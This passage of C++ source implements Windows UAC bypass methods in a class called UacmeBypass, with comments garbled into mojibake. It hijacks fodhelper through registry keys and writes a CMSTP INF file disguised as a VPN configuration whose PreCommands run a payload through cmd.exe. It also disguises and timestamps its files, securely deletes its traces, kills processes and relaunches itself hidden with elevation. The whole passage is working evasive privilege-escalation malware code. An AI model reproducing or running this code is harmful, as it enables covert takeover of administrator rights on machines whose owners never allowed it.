        8 * sizeof(wchar_t));

    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ,
        reinterpret_cast<const BYTE*>(L""), sizeof(wchar_t));
    RegCloseKey(hKey);

    // 4. �ļ�������Ȼ���������ԭ�л��ƣ�
    fs::path fodhelperPath = GetSystemDirectory() + L"fodhelper.exe";
    std::wstring fakeName = L"wlansvc_" + GetRandomString(4) + L".log"; // αװ���������־
    fs::path tempFodhelper = GetTempDirectory() / fakeName;

    // ע�����������ƻ���̬������ǰ1KB���������ݣ�
    std::vector<BYTE> junkData(1024);
    std::generate(junkData.begin(), junkData.end(), []() { return rand() % 256; });
    std::ofstream(tempFodhelper, std::ios::binary).write(
        reinterpret_cast<const char*>(junkData.data()), junkData.size()
    );

    // ׷����ʵfodhelper.exe������ǩ������
    AppendFile(fodhelperPath, tempFodhelper);
    CloneFileAttributes(fodhelperPath, tempFodhelper); // ��¡Դ�ļ�ʱ���/����

    // 5. ������αװ��ͨ��explorer.exe�����̴�����
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = L"explorer.exe";
    sei.lpParameters = (L"/factory," + randomKey).c_str(); // ����ģʽ���ش���
    sei.fMask = SEE_MASK_NO_CONSOLE | SEE_MASK_FLAG_NO_UI;
    sei.nShow = SW_HIDE;
    if (!ShellExecuteExW(&sei)) return false;

    // 6. ���������ϣ�ע���+�ļ�+���̣�����ԭ�л��ƣ�
    CleanupAfterProcess(L"explorer.exe", [this, fullRegPath, tempFodhelper]() {
        // �ݹ�ɾ��ע�����Կ�ע����أ�
        SHDeleteKeyW(HKEY_CURRENT_USER, fullRegPath.substr(0, fullRegPath.find_last_of(L'\\')).c_str());

        // �ļ����飨3�θ���д�� + ������ɾ����
        SecureDelete(tempFodhelper);

        // ����������̣��������ܴ��ڵ�dllhost.exe��
        system("taskkill /IM fodhelper.exe /F /T >nul 2>&1");
        system("taskkill /IM dllhost.exe /F /T >nul 2>&1");
        });
    return true;
}

bool UacmeBypass::Method_CMSTPProtocol(const fs::path& payload) {
    const std::wstring sysDir = GetSystemDirectory();

    // 1. ��̬���ɸ߶Ȼ�����INF�ļ�����·��������������
    std::wstring infName = L"VPN_" + GetRandomString(6) + L".inf"; // αװ��VPN����
    fs::path infPath = GetTempDirectory() / infName;
    std::wstring randomExt = L"." + GetRandomString(3); // ����չ�����ͻ���
    std::wstring randomType = L"VPNConfig_" + GetRandomString(8); // αװ��VPN��������

    // 2. �������Ի���INF���ݣ��ؼ��Ż�������������
    std::ofstream infFile(infPath);
    if (!infFile) return false;

    // ��ӺϷ�VPN�����ֶ�
    infFile << "[version]\n"
        << "Signature=$chicago$\n"
        << "AdvancedINF=2.5\n\n"
        << "[DefaultInstall]\n"
        << "CustomDestination=CustInstDest\n"
        << "RunPreSetupCommands=PreCommands\n\n"  // �ؼ�ִ�е�
        << "[PreCommands]\n"
        << "cmd.exe /c \"" << payload.string() << "\"\n"    // ʹ��cmd.exeִ��Payload
        << "taskkill /IM cmstp.exe /F /T\n\n"     // ǿ����ֹ���̼��ٺۼ�
        << "[CustInstDest]\n"
        << "49000,49001=AllUserSection, 7\n\n"    // �Ϸ����ö�
        << "[AllUserSection]\n"
        << "\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\","
        << "\"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\n\n"
        << "[Strings]\n"
        << "ServiceName=\"VPNService\"\n";         // αװ������
    infFile.close();

    // 3. ע��������ǿ�����ԣ�����ԭ�л��ƣ�
    HKEY hKey;
    // ʹ��REGFORCE_BACKUP_RESTOREȨ���ƹ�д����
    if (RegCreateKeyExW(HKEY_CURRENT_USER, (L"Software\\Classes\\" + randomExt).c_str(), 0, NULL,
        REG_OPTION_VOLATILE | REG_OPTION_BACKUP_RESTORE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    RegSetValueExW(hKey, NULL, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(randomType.c_str()),
        static_cast<DWORD>((randomType.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hKey);

    // 4. ����ִ�������Ż���������������ɣ�
    std::wstring cmd = L"\"" + sysDir + L"cmstp.exe\" /s /au \"" + infPath.wstring() + L"\"";
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
        (L"Software\\Classes\\" + randomType + L"\\shell\\open\\command").c_str(),
        0, NULL, REG_OPTION_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    RegSetValueExW(hKey, NULL, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(cmd.c_str()),
        static_cast<DWORD>((cmd.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hKey);

    // 5. ͨ��COM�ӿھ�Ĭ�������޴��ڣ�
    CoInitialize(NULL);
    IUnknown* pUnknown = nullptr;
    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IUnknown, (void**)&pUnknown);
    if (SUCCEEDED(hr)) {
        IShellLinkW* psl = nullptr;
        hr = pUnknown->QueryInterface(IID_IShellLinkW, (void**)&psl);
        if (SUCCEEDED(hr)) {
            // ʹ��ϵͳ����αװ������
            psl->SetPath(L"explorer.exe");  // ֱ�Ӵ��ݿ��ַ���ָ��
            psl->SetArguments((L"testfile" + randomExt).c_str());

            IPersistFile* ppf = nullptr;
            hr = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
            if (SUCCEEDED(hr)) {
                fs::path lnkPath = GetTempDirectory() / (L"Update_" + GetRandomString(4) + L".lnk");
                hr = ppf->Save(lnkPath.c_str(), TRUE);
                if (SUCCEEDED(hr)) {
                    SHELLEXECUTEINFOW sei = { sizeof(sei) };
                    sei.lpFile = lnkPath.c_str();
                    sei.nShow = SW_HIDE;
                    sei.fMask = SEE_MASK_NO_CONSOLE | SEE_MASK_FLAG_NO_UI;
                    ShellExecuteExW(&sei);
                }
                SecureDelete(lnkPath); // ����ɾ��LNK
                ppf->Release();
            }
            psl->Release();
        }
        pUnknown->Release();
    }
    CoUninitialize();

    // 6. ���������ϣ�ע���+�ļ�+���̣�����ԭ�л��ƣ�
    CleanupAfterProcess(L"cmstp.exe", [this, randomExt, randomType, infPath]() {
        // �ݹ�ɾ��ע�����
        SHDeleteKeyW(HKEY_CURRENT_USER, (L"Software\\Classes\\" + randomExt).c_str());
        SHDeleteKeyW(HKEY_CURRENT_USER, (L"Software\\Classes\\" + randomType).c_str());

        // �ļ����飨����д��+ɾ����
        SecureDelete(infPath);

        // ����CMSTP��������
        system("taskkill /IM cmstp.exe /F");
        });
    return true;
}
// ===================== �������� =====================
bool IsElevated() {
    BOOL elevated = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, size, &size)) {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    return elevated;
}

std::wstring GetLastErrorAsString() {
    DWORD errorId = GetLastError();
    if (errorId == 0) return L"Unknown error";

    LPWSTR buffer = nullptr;
    size_t size = FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL, errorId, 0, (LPWSTR)&buffer, 0, NULL
    );

    std::wstring message(buffer, size);
    LocalFree(buffer);
    return message;
}

void RunSilentAdminTask() {
    // ʵ�ʵĹ���Ա�������
    // ���磺�޸�ϵͳ���á���װ�����

    // ʾ������������Ա�ļ�
    std::ofstream adminFile("C:\\Windows\\System32\\admin_success.txt");
    adminFile << "Administrator privileges obtained at "
        << std::chrono::system_clock::now().time_since_epoch().count();
    adminFile.close();

    // ��ʾ�ɹ���Ϣ
    MessageBoxW(
        NULL,
        L"Administrator privileges have been successfully obtained.\nSystem security operations completed.",
        L"Privilege Escalation Success",
        MB_OK | MB_ICONINFORMATION | MB_TOPMOST
    );
}

// ===================== ��ֹ��ʵ�����еĻ��� =====================
// ����Ƿ�����ʵ�����У�������Ȩ�޸��ߵ�ʵ��
bool CheckExistingInstance() {
    // ����������ȷ��ֻ��һ��ʵ������
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\UacmeBypassInstance");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // ����ʵ�����У����Ȩ��
        BOOL currentElevated = IsElevated();

        // ���Դ�����ʵ���Ļ������Ի�ȡ��Ȩ����Ϣ
        HANDLE hExistingMutex = OpenMutexW(MUTEX_ALL_ACCESS, FALSE, L"Global\\UacmeBypassInstance");
        if (hExistingMutex) {
            // ��ȡ����ʵ����Ȩ�ޣ��򻯴���ʵ��Ӧ���п�����Ҫ�����ӵ�IPC��
            BOOL existingElevated = FALSE;
            DWORD size = 0;
            if (GetKernelObjectSecurity(hExistingMutex, OWNER_SECURITY_INFORMATION, NULL, 0, &size) ||
                GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
                PSECURITY_DESCRIPTOR pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, size);
                if (pSD && GetKernelObjectSecurity(hExistingMutex, OWNER_SECURITY_INFORMATION, pSD, size, &size)) {
                    PSID pOwnerSid = NULL;
                    BOOL ownerDefaulted = FALSE;
                    if (GetSecurityDescriptorOwner(pSD, &pOwnerSid, &ownerDefaulted)) {
                        // ����������Ƿ�Ϊ����Ա��
                        SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
                        PSID pAdminSid = NULL;
                        if (AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdminSid)) {
                            existingElevated = EqualSid(pOwnerSid, pAdminSid);
                            FreeSid(pAdminSid);
                        }
                    }
                }
                LocalFree(pSD);
            }
            CloseHandle(hExistingMutex);

            // �Ƚ�Ȩ�ޣ�����Ȩ�޸��ߵ�ʵ��
            if (existingElevated && !currentElevated) {
                // ���й���ԱȨ��ʵ�����У���ǰ��ͨȨ��ʵ���˳�
                return true;
            }
            else if (!existingElevated && currentElevated) {
                // ��ǰ�ǹ���ԱȨ�ޣ�������ͨȨ��ʵ������
                // ����֪ͨ��ͨȨ��ʵ���˳����˴��򻯴���ֱ�Ӽ������У�
                return false;
            }
        }

        // ����޷�ȷ��Ȩ�ޣ�Ĭ���˳���ǰʵ��
        return true;
    }

    // ��ǰ�ǵ�һ��ʵ��
    return false;
}

int admin() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // ����Ƿ�����ʵ�����У�������Ȩ�޸��ߵ�ʵ��
    if (CheckExistingInstance()) {
        return 0; // ���и���Ȩ��ʵ�����У���ǰʵ���˳�
    }

    // ��������в������ж��Ƿ��Ѿ�����Ȩ���ʵ��
    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    bool isElevatedInstance = false;
    for (int i = 1; i < argc; ++i) {
        if (wcscmp(argv[i], L"/elevated") == 0) {
            isElevatedInstance = true;
            break;
        }
    }
    LocalFree(argv);

    if (isElevatedInstance || IsElevated()) {
        RunSilentAdminTask();
        return 0;
    }

    UacmeBypass bypass;
    wchar_t currentPath[MAX_PATH];
    if (GetModuleFileNameW(nullptr, currentPath, MAX_PATH) == 0) {
        std::wstring errorMsg = L"Failed to get current process path. Error: " + GetLastErrorAsString();
        MessageBoxW(NULL, errorMsg.c_str(), L"Operation Failed", MB_OK | MB_ICONERROR);
        return 1;
    }

    // �޸ģ�������ʱ����ʱʹ��.exe��չ��
    auto tempFilePath = bypass.CreateTempFile(L".exe"); // ��Ϊ.exe��չ��
    if (tempFilePath.empty()) {
        std::wstring errorMsg = L"Failed to create temp file. Error: " + GetLastErrorAsString();
        MessageBoxW(NULL, errorMsg.c_str(), L"Operation Failed", MB_OK | MB_ICONERROR);
        return 1;
    }

    if (!bypass.CopyFileWithObfuscation(currentPath, tempFilePath)) {
        bypass.SecureDelete(tempFilePath);
        std::wstring errorMsg = L"Failed to copy file. Error: " + GetLastErrorAsString();
        MessageBoxW(NULL, errorMsg.c_str(), L"Operation Failed", MB_OK | MB_ICONERROR);
        return 1;
    }

    bypass.SetRandomFileTime(tempFilePath);

    // �޸ģ���ȷ���������в���
    std::wstring commandLine = L"\"" + tempFilePath.wstring() + L"\" /elevated";

    // �޸ģ�ʹ�ô����Ի��Ƶ��Զ��ƹ���������ȷ��������
    if (bypass.AutoBypassWithRetry(commandLine, 3)) {
        std::this_thread::sleep_for(std::chrono::seconds(3));
        // �ӳ�ɾ����ʱ����
        std::thread([tempFilePath]() {
            std::this_thread::sleep_for(std::chrono::seconds(5));
            fs::remove(tempFilePath);
            }).detach();
        return 0;
    }

    bypass.SecureDelete(tempFilePath);
    std::wstring errorMsg = L"UAC bypass failed. Error: " + GetLastErrorAsString();
    MessageBoxW(NULL, errorMsg.c_str(), L"Operation Failed", MB_OK | MB_ICONERROR);
    return 1;
}